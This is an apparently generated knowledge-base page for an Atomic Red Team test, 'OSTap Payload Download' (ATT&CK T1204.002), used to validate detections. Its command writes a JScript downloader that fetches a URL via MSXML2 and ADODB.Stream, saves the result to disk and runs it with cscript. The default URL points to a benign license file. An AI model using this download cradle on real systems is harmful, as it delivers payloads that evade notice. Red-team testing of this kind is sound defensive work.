---
atomic_guid: "3f3af983-118a-4fa1-85d3-ba4daa739d80"
title: "OSTap Payload Download"
framework: "atomic"
generated: "true"
attack_technique_id: "T1204.002"
attack_technique_name: "User Execution: Malicious File"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "3f3af983-118a-4fa1-85d3-ba4daa739d80"
  - "OSTap Payload Download"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# OSTap Payload Download

Uses cscript //E:jscript to download a file

## Metadata

- Atomic GUID: 3f3af983-118a-4fa1-85d3-ba4daa739d80
- Technique: T1204.002: User Execution: Malicious File
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1204.002/T1204.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1204-user_execution|T1204.002]]

## Input Arguments

### file_url

- description: URL to retrieve file from
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

### script_file

- description: File to execute jscript code from
- type: path
- default: %TEMP%\OSTapGet.js

## Executor

- name: command_prompt

### Command

```cmd
echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
cscript //E:Jscript #{script_file}
```

### Cleanup

```cmd
del #{script_file} /F /Q >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml)
